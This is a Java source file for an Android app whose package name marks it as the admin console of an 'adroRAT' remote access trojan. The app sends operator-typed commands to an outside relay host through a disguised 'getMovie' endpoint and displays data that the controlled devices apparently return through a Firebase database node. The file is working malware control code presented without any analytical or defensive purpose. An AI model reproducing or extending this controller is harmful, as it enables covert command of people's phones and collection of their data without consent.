package com.adroRAT.adminapp;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.IOException;

import static com.adroRAT.adminapp.FirebaseInitialize.MY_REF;

public class MainActivity extends AppCompatActivity {

  EditText request;
  TextView data_show;
  Button go_btn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        FirebaseInitialize.FirebaseInitialize();
        request=findViewById(R.id.request_edit);
        data_show=findViewById(R.id.data_txt);
        go_btn =findViewById(R.id.run_btn);
        go_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
             String req=   request.getText().toString();
         new SendRequest().execute(req);
             MY_REF.child("reqdata").addValueEventListener(new ValueEventListener() {
                 @Override
                 public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                     String data= dataSnapshot.getValue(String.class);
                     data_show.setText(data);
                 }

                 @Override
                 public void onCancelled(@NonNull DatabaseError databaseError) {

                 }
             });

            }
        });


    }
    public class SendRequest extends AsyncTask<String,Void,Void>{
        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            MY_REF.child("reqdata").addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                    String data= dataSnapshot.getValue(String.class);
                    data_show.setText(data);
                }

                @Override
                public void onCancelled(@NonNull DatabaseError databaseError) {
                }
            });
        }
        @Override
        protected Void doInBackground(String... strings) {
            try {
                Document doc= Jsoup.connect( "http://anfaas-com.stackstaging.com/getMovie?uid="+strings[0]).timeout(100000).get();
            } catch (IOException e) {
                e.printStackTrace();
            }
            return null;
        }
    }
}
